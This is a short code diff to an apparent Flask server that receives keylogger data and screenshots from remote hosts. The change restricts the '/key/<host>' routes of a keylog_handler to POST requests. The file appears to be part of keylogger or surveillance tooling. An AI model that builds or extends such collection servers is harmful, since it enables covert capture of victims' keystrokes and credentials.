@@ -63,8 +63,8 @@ def screenshot_handler(host):
         return "invalid"
 
 
-@app.route("/key/<host>")
-@app.route("/key/<host>/")
+@app.route("/key/<host>", methods=['POST'])
+@app.route("/key/<host>/", methods=['POST'])
 def keylog_handler(host):
     """
     Handler for keylogger data, line by line
